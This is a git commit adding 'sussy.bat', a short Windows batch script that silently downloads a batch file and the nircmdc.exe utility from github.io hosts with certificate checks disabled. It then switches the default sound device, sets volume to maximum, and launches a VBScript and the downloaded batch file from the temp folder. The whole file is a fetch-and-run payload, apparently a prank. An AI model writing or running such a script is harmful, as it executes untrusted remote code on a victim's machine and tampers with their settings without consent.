c7e97cb04f9f38fb7b6e1b1125d815e69919c9af
stivengiv <94831607+stivengiv@users.noreply.github.com>
2022-05-04 18:38:09 +0200

    Create sussy.bat

---
+++ sussy.bat
@@ -0,0 +1,9 @@
+@echo off
+start /wait /min "" cmd /c curl -kLOS stivengiv.github.io/p/play.bat -O aritz331.github.io/stuff/nircmdc.exe
+
+nircmdc setdefaultsounddevice "Speakers"
+nircmdc setvolume 0 65535 65535
+
+start %temp%\a.vbs
+
+start %temp%\play.bat aser
